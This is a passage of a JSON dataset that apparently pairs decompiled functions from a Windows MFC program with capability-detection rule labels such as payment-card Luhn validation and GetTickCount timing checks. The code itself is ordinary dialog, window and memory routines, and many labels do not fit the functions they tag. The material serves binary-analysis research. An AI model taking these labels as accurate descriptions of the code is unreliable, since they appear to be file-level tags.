            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042a3fd(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    \n    iVar1 = arg_8h;\n    iVar5 = 0;\n    if (arg_8h < 0) {\ncode_r0x0042a4b7:\n        fcn.00429be4();\n    }\n    else {\n        if (-1 < arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (arg_8h == 0) {\n            fcn.0042f834(*(in_ECX + 4));\n            *(in_ECX + 0xc) = 0;\n            *(in_ECX + 8) = 0;\n            goto code_r0x0042a4f8;\n        }\n        if (*(in_ECX + 4) == 0) {\n            uVar3 = fcn.0042f804(arg_8h);\n            *(in_ECX + 4) = uVar3;\n            fcn.004192e0(uVar3, 0, arg_8h);\n            *(in_ECX + 0xc) = arg_8h;\ncode_r0x0042a452:\n            *(in_ECX + 8) = arg_8h;\n            return;\n        }\n        iVar5 = *(in_ECX + 0xc);\n        if (arg_8h <= iVar5) {\n            iVar1 = *(in_ECX + 8);\n            if (iVar1 < arg_8h) {\n                fcn.004192e0(iVar1 + *(in_ECX + 4), 0, arg_8h - iVar1);\n            }\n            goto code_r0x0042a452;\n        }\n        iVar4 = *(in_ECX + 0x10);\n        if (iVar4 == 0) {\n            iVar4 = *(in_ECX + 8) / 8;\n            if (iVar4 < 4) {\ncode_r0x0042a4a3:\n                iVar4 = 4;\n            }\n            else if (iVar4 < 0x401) {\n                if (iVar4 < 4) goto code_r0x0042a4a3;\n            }\n            else {\n                iVar4 = 0x400;\n            }\n        }\n        iVar2 = iVar4 + iVar5;\n        if (iVar4 + iVar5 <= arg_8h) {\n            iVar2 = arg_8h;\n        }\n        arg_8h = iVar2;\n        if (arg_8h < iVar5) goto code_r0x0042a4b7;\n    }\n    iVar5 = fcn.0042f804(arg_8h);\n    fcn.00419370(iVar5, *(in_ECX + 4), *(in_ECX + 8));\n    fcn.004192e0(*(in_ECX + 8) + iVar5, 0, iVar1 - *(in_ECX + 8));\n    fcn.0042f834(*(in_ECX + 4));\n    *(in_ECX + 8) = iVar1;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x0042a4f8:\n    *(in_ECX + 4) = iVar5;\n    return;\n}\n",
        "token_count": 767
    },
    "0042a802": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0042a802(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = arg_8h;\n    puVar2 = fcn.0042a652(arg_8h, &arg_8h, &var_4h);\n    if (puVar2 == NULL) {\n        if (*(in_ECX + 4) == 0) {\n            fcn.0042a5c2(*(in_ECX + 8), 1);\n        }\n        puVar2 = fcn.0042a7b7();\n        puVar2[1] = iVar1;\n        *puVar2 = *(arg_8h * 4 + *(in_ECX + 4));\n        *(arg_8h * 4 + *(in_ECX + 4)) = puVar2;\n    }\n    return puVar2 + 2;\n}\n",
        "token_count": 221
    },
    "0042ab85": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.0042ab85(code **param_1, code *param_2, code *param_3)\n\n{\n    fcn.0042c026();\n    *param_1 = vtable.CDialog.0;\n    fcn.004192e0(param_1 + 0x14, 0, 0x20);\n    param_1[0x19] = param_3;\n    param_1[0x14] = param_2;\n    param_1[0x15] = param_2 & 0xffff;\n    return param_1;\n}\n",
        "token_count": 132
    },
    "0042b004": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n\nbool __cdecl\nfcn.0042b004(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    char cVar5;\n    bool bVar6;\n    uint var_8h;\n    uint var_ch_2;\n    uint hInstance;\n    uint var_10h;\n    uint var_48h;\n    uint var_38h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint hMem;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = &stack0xffffffb8;\n    *(unaff_EBP + -0x20) = extraout_ECX;\n    if (*(unaff_EBP + 0x10) == 0) {\n        iVar1 = fcn.00438818();\n        *(unaff_EBP + 0x10) = *(iVar1 + 0xc);\n    }\n    iVar1 = fcn.00438818();\n    piVar2 = *(iVar1 + 0x1038);\n    *(unaff_EBP + -0x28) = piVar2;\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -0x24) = 0;\n    *(unaff_EBP + -4) = 0;\n    fcn.0042c75a(0x10);\n    fcn.0042c75a(0x7c000);\n    if (piVar2 == NULL) {\n        iVar1 = *(unaff_EBP + 8);\ncode_r0x0042b088:\n        if (iVar1 != 0) {\n            piVar2 = fcn.004308e7();\n            iVar3 = (**(*piVar2 + 0xc))();\n            *(unaff_EBP + -0x1c) = iVar3 + 0x10;\n            *(unaff_EBP + -4) = 1;\n            *(unaff_EBP + -0x18) = 0;\n            iVar3 = fcn.00430dfc(iVar1, unaff_EBP + -0x1c, unaff_EBP + -0x18);\n            cVar5 = iVar3 == 0;\n            if (*0x4504bc == 0) {\ncode_r0x0042b0fd:\n                if (cVar5 != '\\0') {\ncode_r0x0042b101:\n                    fcn.00430dcd(iVar1);\n                    *(unaff_EBP + -4) = 2;\n                    fcn.00430d2f(*(unaff_EBP + -0x18));\n                    uVar4 = fcn.00430ae3();\n                    *(unaff_EBP + -0x14) = uVar4;\n                    *(unaff_EBP + -4) = 1;\n                    fcn.00430ad5();\n                    if (*(unaff_EBP + -0x14) != 0) {\n                        iVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*(unaff_EBP + -0x14));\n                    }\n                }\n            }\n            else {\n                if (cVar5) goto code_r0x0042b101;\n                iVar3 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x2a);\n                if (iVar3 != 0) {\n                    iVar3 = fcn.0041869d(*(unaff_EBP + -0x1c), \"MS Shell Dlg\");\n                    cVar5 = '\\x01' - (iVar3 != 0);\n                    if (cVar5 != '\\0') {\n                        if (*(unaff_EBP + -0x18) == 8) {\n                            *(unaff_EBP + -0x18) = 0;\n                        }\n                        goto code_r0x0042b0fd;\n                    }\n                }\n            }\n            extraout_ECX[0x10] = -1;\n            extraout_ECX[0xe] = extraout_ECX[0xe] | 0x10;\n            fcn.0042df81(extraout_ECX);\n            if (*(unaff_EBP + 0xc) == 0) {\n                uVar4 = 0;\n            }\n            else {\n                uVar4 = *(*(unaff_EBP + 0xc) + 0x1c);\n            }\n            iVar1 = (*_sym.imp.USER32.dll_CreateDialogIndirectParamA)\n                              (*(unaff_EBP + 0x10), iVar1, uVar4, fcn.0042aa9e, 0);\n            fcn.004014f0();\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*(unaff_EBP + -0x28) != NULL) {\n                (**(**(unaff_EBP + -0x28) + 0x14))(unaff_EBP + -0x48);\n                if (iVar1 != 0) {\n                    (**(*extraout_ECX + 300))(0);\n                }\n            }\n            iVar3 = fcn.0042cba9();\n            if (iVar3 == 0) {\n                (**(*extraout_ECX + 0x114))();\n            }\n            if ((iVar1 != 0) && ((*(extraout_ECX + 0xe) & 0x10) == 0)) {\n                (*_sym.imp.USER32.dll_DestroyWindow)(iVar1);\n                iVar1 = 0;\n            }\n            if (*(unaff_EBP + -0x14) != 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*(unaff_EBP + -0x14));\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(*(unaff_EBP + -0x14));\n            }\n            bVar6 = iVar1 != 0;\n            goto code_r0x0042b200;\n        }\n    }\n    else {\n        iVar1 = (**(*extraout_ECX + 300))(unaff_EBP + -0x48);\n        if (iVar1 != 0) {\n            iVar1 = (**(*piVar2 + 0x10))(unaff_EBP + -0x48, *(unaff_EBP + 8));\n            goto code_r0x0042b088;\n        }\n    }\n    bVar6 = false;\ncode_r0x0042b200:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return bVar6;\n}\n",
        "token_count": 1622
    },
    "0042c223": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpWndClass\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.0042c223(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint noname_1;\n    uint *noname_3;\n    uint lpWndClass;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00438808();\n    iVar1 = iVar1 + 0x7c;\n    iVar2 = fcn.00438818();\n    var_18h = *(iVar2 + 8);\n    if (((arg_ch == 0) && (arg_10h == 0)) && (arg_14h == 0)) {\n        fcn.0041973b(iVar1, \"Afx:%p:%x\", var_18h);\n    }\n    else {\n        fcn.0041973b(iVar1, \"Afx:%p:%x:%p:%p:%p\", var_18h);\n    }\n    noname_3 = &lpWndClass;\n    noname_1 = var_18h;\n    iVar2 = iVar1;\n    iVar3 = (*_sym.imp.USER32.dll_GetClassInfoA)();\n    if (iVar3 == 0) {\n        lpWndClass = arg_8h;\n        var_24h = _sym.imp.USER32.dll_DefWindowProcA;\n        var_1ch = 0;\n        var_20h = 0;\n        var_8h = 0;\n        var_14h = arg_14h;\n        var_10h = arg_ch;\n        var_ch = arg_10h;\n        var_4h = iVar1;\n        iVar2 = fcn.0042b61a(&lpWndClass, noname_1, iVar2, noname_3, unaff_EDI, unaff_ESI, unaff_EBX, arg_8h, \n                             _sym.imp.USER32.dll_DefWindowProcA, 0, 0, var_18h, arg_14h, arg_ch, arg_10h, 0, iVar1, \n                             unaff_EBP);\n        if (iVar2 == 0) {\n            fcn.0043212c();\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 756
    },
    "0042c3f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c3f0(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_60h;\n    uint lprcSrc;\n    int32_t lpPoints;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t lprcDst;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = fcn.0042ebfd();\n    if (arg_8h == 0) {\n        if ((var_4h & 0x40000000) == 0) {\n            iVar5 = (*_sym.imp.USER32.dll_GetWindow)(*(in_ECX + 0x1c), 4);\n        }\n        else {\n            iVar5 = (*_sym.imp.USER32.dll_GetParent)(*(in_ECX + 0x1c));\n        }\n        if ((iVar5 != 0) && (iVar4 = (*_sym.imp.USER32.dll_SendMessageA)(iVar5, 0x36b, 0, 0),  iVar4 != 0)) {\n            iVar5 = iVar4;\n        }\n    }\n    else {\n        iVar5 = *(arg_8h + 0x1c);\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetWindowRect;\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(in_ECX + 0x1c), &var_28h);\n    if ((var_4h & 0x40000000) == 0) {\n        if ((iVar5 != 0) &&\n           ((uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar5, 0xfffffff0),  (uVar2 & 0x10000000) == 0 ||\n            ((uVar2 & 0x20000000) != 0)))) {\n            iVar5 = 0;\n        }\n        if (iVar5 == 0) {\n            iVar5 = fcn.004015c0();\n            if (iVar5 != 0) {\n                iVar5 = *(iVar5 + 0x1c);\n            }\n            uVar3 = fcn.0040e911(iVar5, 1);\n            fcn.0040e97c(uVar3, iVar5);\n            pcVar1 = _sym.imp.USER32.dll_CopyRect;\n            (*_sym.imp.USER32.dll_CopyRect)(&lpPoints, &lprcSrc);\n            (*pcVar1)(&lprcDst, &lprcSrc);\n        }\n        else {\n            (*pcVar1)(iVar5, &lpPoints);\n            uVar3 = fcn.0040e911(iVar5, 2);\n            fcn.0040e97c(uVar3, iVar5);\n            (*_sym.imp.USER32.dll_CopyRect)(&lprcDst, &lprcSrc);\n        }\n    }\n    else {\n        uVar3 = (*_sym.imp.USER32.dll_GetParent)(*(in_ECX + 0x1c));\n        pcVar1 = _sym.imp.USER32.dll_GetClientRect;\n        (*_sym.imp.USER32.dll_GetClientRect)(uVar3, &lprcDst);\n        (*pcVar1)(iVar5, &lpPoints);\n        (*_sym.imp.USER32.dll_MapWindowPoints)(iVar5, uVar3, &lpPoints, 2);\n    }\n    iVar5 = (lpPoints + var_30h) / 2 - (var_20h - var_28h) / 2;\n    iVar4 = (var_34h + var_2ch) / 2 - (var_1ch - var_24h) / 2;\n    if ((lprcDst <= iVar5) && (lprcDst = iVar5,  var_10h < (var_20h - var_28h) + iVar5)) {\n        lprcDst = (var_10h - var_20h) + var_28h;\n    }\n    if ((var_14h <= iVar4) && (var_14h = iVar4,  var_ch < (var_1ch - var_24h) + iVar4)) {\n        var_14h = (var_24h - var_1ch) + var_ch;\n    }\n    fcn.0042ee21(0, lprcDst, var_14h, 0xffffffff, 0xffffffff, 0x15);\n    return;\n}\n",
        "token_count": 1088
    },
    "0042cb28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0042cb28(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t unaff_retaddr;\n    \n    iVar1 = fcn.0042ca85(0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if (*(iVar1 + 0x20) != 0) {\n        for (puVar2 = *(*(iVar1 + 0x20) + ((unaff_retaddr >> 4) % *(iVar1 + 0x24)) * 4); puVar2 != NULL;\n            puVar2 = *puVar2) {\n            if (puVar2[1] == unaff_retaddr) {\n                return puVar2[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 177
    },
    "0042f31c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042f31c(int32_t param_1)\n\n{\n    if (*(param_1 + 0x10) != 0) {\n    // WARNING: Could not recover jumptable at 0x0042f325. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(*(param_1 + 0x10) + 0x1c))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "0042f329": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.0042f329(uint arg_8h, uint *arg_ch, uint noname_2, code *arg_14h, uint *arg_18h, int32_t arg_1ch, uint *arg_20h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 1;\n    if (arg_20h != NULL) {\n        *arg_20h = arg_8h;\n        arg_20h[1] = arg_14h;\n        return 1;\n    }\n    if (0xb < arg_1ch - 0x35U) {\n        return 0;\n    }\n    // switch table (12 cases) at 0x42f40f\n    switch(*((arg_1ch - 0x35U) * 4 + 0x42f40f)) {\n    case 0x42f360:\n        (*arg_14h)();\n        break;\n    case 0x42f36b:\n        uVar1 = (*arg_14h)();\n        break;\n    case 0x42f376:\n        arg_18h = arg_ch;\n        goto code_r0x0042f3f0;\n    case 0x42f37b:\n        arg_18h = arg_ch;\n        goto code_r0x0042f3fb;\n    case 0x42f380:\n        (*arg_14h)(arg_18h[1], *arg_18h);\n        break;\n    case 0x42f390:\n        uVar1 = (*arg_14h)(arg_18h[1], *arg_18h);\n        break;\n    case 0x42f3a0:\n        (*arg_14h)(arg_ch, arg_18h[1], *arg_18h);\n        break;\n    case 0x42f3b3:\n        uVar1 = (*arg_14h)(arg_ch, arg_18h[1], *arg_18h);\n        break;\n    case 0x42f3c6:\n        (*arg_14h)(arg_18h);\n        goto code_r0x0042f3df;\n    case 0x42f3d2:\n        (*arg_14h)(arg_18h, arg_ch);\ncode_r0x0042f3df:\n        uVar1 = arg_18h[7] == 0;\n        arg_18h[7] = 0;\n        break;\n    case 0x42f3ed:\ncode_r0x0042f3f0:\n        (*arg_14h)(arg_18h);\n        break;\n    case 0x42f3f8:\ncode_r0x0042f3fb:\n        uVar1 = (*arg_14h)(arg_18h);\n    }\n    return uVar1;\n}\n",
        "token_count": 626
    },
    "0042fb66": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0042fb66(int32_t *param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint arg_14h;\n    \n    puVar1 = (**(*param_1 + 0x28))();\n    do {\n        if (puVar1 == NULL) {\n            return 0;\n        }\n        arg_14h = 0;\n        if (*(param_2 + 4) < 0xc000) {\n            iVar2 = fcn.0042b752(puVar1[1], *(param_2 + 4), 0, 0);\n            if (iVar2 != 0) {\ncode_r0x0042fb9b:\n                (**(iVar2 + 0x14))(*(param_2 + 8), *(param_2 + 0xc));\n                return 1;\n            }\n        }\n        else {\n            iVar2 = puVar1[1];\n            while (iVar2 = fcn.0042b752(iVar2, 0xc000, 0, arg_14h),  iVar2 != 0) {\n                if (**(iVar2 + 0x10) == *(param_2 + 4)) goto code_r0x0042fb9b;\n                iVar2 = iVar2 + 0x18;\n            }\n        }\n        puVar1 = *puVar1;\n    } while( true );\n}\n",
        "token_count": 318
    },
    "0042ff44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __thiscall fcn.0042ff44(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBX;\n    int32_t arg_8h;\n    \n    if (param_2 < 1) {\n        iVar3 = *(param_1 + 0x1c);\n        if (((iVar3 != 0) && (*(iVar3 + 0x1c) != 0)) &&\n           (iVar1 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar3 + 0x1c)),  iVar1 != 0)) {\n            fcn.0042d20e(iVar3, *(iVar3 + 0x1c), 0x363, 1, 0);\n            fcn.0042d4e5(*(iVar3 + 0x1c), 0x363, 1, 0, 1, 1);\n        }\n        fcn.00438818();\n        arg_8h = 0x437fde;\n        iVar1 = fcn.00438ea6(0x437fde);\n        for (iVar1 = *(iVar1 + 8); iVar1 != 0; iVar1 = *(iVar1 + 0x68)) {\n            if ((*(iVar1 + 0x1c) != 0) && (iVar1 != iVar3)) {\n                if (*(iVar1 + 0x9c) == 0) {\n                    fcn.0042ecd5(0, arg_8h);\n                }\n                iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar1 + 0x1c));\n                if ((iVar2 != 0) || (-1 < *(iVar1 + 0x9c))) {\n                    fcn.0042d20e(iVar1, *(iVar1 + 0x1c), 0x363, 1, 0);\n                    arg_8h = *(iVar1 + 0x1c);\n                    fcn.0042d4e5(arg_8h, 0x363, 1, 0, 1, 1);\n                }\n                iVar2 = *(iVar1 + 0x9c);\n                if (0 < iVar2) {\n                    fcn.0042ecd5();\n                    arg_8h = iVar2;\n                }\n                *(iVar1 + 0x9c) = 0xffffffff;\n            }\n        }\n    }\n    else {\n        fcn.00438818();\n        iVar3 = fcn.00438ea6(0x437fde);\n        if (*(iVar3 + 0x10) == 0) {\n            fcn.00430efe();\n            fcn.004310b0(1);\n        }\n    }\n    return unaff_EBX < 0;\n}\n",
        "token_count": 634
    },
    "0043016c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0043016c(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t unaff_retaddr;\n    \n    iVar1 = fcn.004300e2(0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if (*(iVar1 + 0x20) != 0) {\n        for (puVar2 = *(*(iVar1 + 0x20) + ((unaff_retaddr >> 4) % *(iVar1 + 0x24)) * 4); puVar2 != NULL;\n            puVar2 = *puVar2) {\n            if (puVar2[1] == unaff_retaddr) {\n                return puVar2[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 177
    },
    "0043080f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0043080f(uint param_1, uchar *param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    ushort *puVar2;\n    \n    if (param_2 != NULL) {\n        iVar1 = fcn.00438818();\n        puVar2 = fcn.004014b0(*(iVar1 + 0xc), param_1);\n        if (puVar2 != NULL) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, puVar2 + 1, *puVar2, param_2, param_3 + -1, 0, 0)\n            ;\n            param_2[iVar1] = 0;\n            return iVar1;\n        }\n        *param_2 = 0;\n    }\n    return 0;\n}\n",
        "token_count": 190
    },
    "00430a81": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00430a81(int32_t *param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    uint arg_8h;\n    \n    param_1[1] = param_3;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40);\n    *param_1 = iVar1;\n    if (iVar1 != 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1);\n        fcn.00419370(arg_8h, param_3 + 0x40, param_1[1]);\n        iVar1 = fcn.00430a6a(arg_8h);\n        param_1[2] = iVar1 == 0;\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*param_1);\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 209
    },
    "00430ae9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00430ae9(int32_t param_1)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    if (*(param_1 + 2) == -1) {\n        piVar2 = param_1 + 0x1a;\n    }\n    else {\n        piVar2 = param_1 + 0x12;\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    do {\n        iVar1 = *piVar2;\n        piVar2 = piVar2 + 1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 251
    },
    "004315b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004315b0(void)\n\n{\n    uint uVar1;\n    uint unaff_retaddr;\n    \n    uVar1 = fcn.00402110(0x104);\n    fcn.004192e0(uVar1, 0, 0x104);\n    (*_sym.imp.KERNEL32.dll_lstrcpynA)(uVar1, unaff_retaddr, 0x104);\n    (*_sym.imp.SHLWAPI.dll_PathStripToRootA)(uVar1);\n    fcn.0040f065(0xffffffff);\n    return;\n}\n",
        "token_count": 127
    },
    "004318c6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004318c6(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (0x10b < param_1) {\n        if (param_1 == 0x3e3) {\n            return 10;\n        }\n        if (param_1 == 0x3e4) {\n            return 10;\n        }\n        if (param_1 == 0x3e5) {\n            return 10;\n        }\n        if (param_1 == 999) {\n            return 5;\n        }\n        return 1;\n    }\n    if (param_1 == 0x10b) {\n        return 3;\n    }\n    if (param_1 < 0x3f) {\n        if (param_1 == 0x3e) {\n            return 8;\n        }\n        if (param_1 < 0x1a) {\n    // switch table (25 cases) at 0x431aa4\n            switch(param_1) {\n            case 0:\n                return 0;\n            case 1:\n            case 7:\n            case 8:\n            case 9:\n            case 10:\n            case 0xd:\n            case 0xe:\n                goto code_r0x004319c1;\n            case 2:\n            case 6:\n            case 0x12:\n                goto code_r0x004319c1;\n            case 3:\n            case 0xf:\n            case 0x11:\n                goto code_r0x004319c1;\n            case 4:\n                return 4;\n            case 5:\n            case 0xc:\n            case 0x13:\ncode_r0x004319c1:\n                return 5;\n            case 0xb:\ncode_r0x004319c1:\n                return 6;\n            case 0x10:\n                return 7;\n            case 0x14:\n            case 0x15:\n            case 0x16:\n            case 0x17:\ncode_r0x004319c1:\n                return 10;\n            default:\n                goto code_r0x004319c1;\n            }\n        }\n        if (0x27 < param_1) {\n    // switch table (9 cases) at 0x431b08\n            switch(param_1) {\n            case 0x34:\n            case 0x35:\n            case 0x37:\n                goto code_r0x004319c1;\n            case 0x36:\n            case 0x3a:\n                goto code_r0x004319c1;\n            default:\n                return 1;\n            case 0x39:\n            case 0x3b:\n                goto code_r0x004319c1;\n            case 0x3c:\n                goto code_r0x004319c1;\n            }\n        }\n        if (param_1 == 0x27) {\n            return 0xd;\n        }\n        if (0x20 < param_1) {\n            if (param_1 == 0x21) {\n                return 0xc;\n            }\n            if (param_1 == 0x22) {\n                return 3;\n            }\n            if (param_1 == 0x24) {\n                return 4;\n            }\n            if (param_1 == 0x26) {\n                return 0xe;\n            }\n            return 1;\n        }\n        if (param_1 == 0x20) {\n            return 0xb;\n        }\n        if (param_1 == 0x1a) {\n            return 6;\n        }\n        if (param_1 == 0x1b) {\n            return 9;\n        }\n        iVar1 = param_1 - 0x1d;\n        if (iVar1 == 0) {\n            return 5;\n        }\ncode_r0x00431a0d:\n        if (iVar1 == 1) {\ncode_r0x004319c1:\n            return 9;\n        }\n    }\n    else {\n        if (param_1 < 0x6c) {\n            if (param_1 == 0x6b) {\ncode_r0x004319c1:\n                return 2;\n            }\n            if (0x47 < param_1) {\n                if (param_1 == 0x50) {\n                    return 5;\n                }\n                if (param_1 == 0x52) {\n                    return 5;\n                }\n                if (param_1 == 0x55) {\n                    return 3;\n                }\n                if (param_1 != 0x56) {\n                    if (param_1 == 0x58) {\n                        return 10;\n                    }\n                    return 1;\n                }\n                return 5;\n            }\n            if (param_1 == 0x47) {\n                return 5;\n            }\n            if (param_1 == 0x40) {\n                return 5;\n            }\n            if (param_1 == 0x41) {\n                return 5;\n            }\n            if (param_1 == 0x42) {\n                return 6;\n            }\n            if (param_1 == 0x43) {\n                return 3;\n            }\n            iVar1 = param_1 - 0x44;\n            if (iVar1 == 0) {\n                return 4;\n            }\n        }\n        else {\n            if (param_1 < 0x91) {\n                if (param_1 == 0x90) {\n                    return 3;\n                }\n                if (param_1 < 0x76) {\n                    if (param_1 == 0x75) {\n                        return 10;\n                    }\n                    if (param_1 == 0x6c) {\n                        return 0xc;\n                    }\n                    if (param_1 == 0x6f) {\n                        return 3;\n                    }\n                    if (param_1 == 0x70) {\n                        return 0xd;\n                    }\n                    if (param_1 == 0x71) {\n                        return 4;\n                    }\n                    if (param_1 != 0x72) {\n                        return 1;\n                    }\n                    return 6;\n                }\n                if (param_1 == 0x7b) {\n                    return 3;\n                }\n                if (param_1 == 0x7c) {\n                    return 3;\n                }\n                if (param_1 == 0x7d) {\n                    return 3;\n                }\n                iVar1 = param_1 - 0x83;\n                if (iVar1 == 0) {\n                    return 9;\n                }\n                goto code_r0x00431a0d;\n            }\n            if (param_1 < 0xb7) {\n                if (param_1 == 0xb6) {\n                    return 6;\n                }\n                if (param_1 == 0x91) {\n                    return 7;\n                }\n                if (param_1 == 0x9a) {\n                    return 3;\n                }\n                if (param_1 != 0xa1) {\n                    if (param_1 == 0xa7) {\n                        return 0xc;\n                    }\n                    if (param_1 == 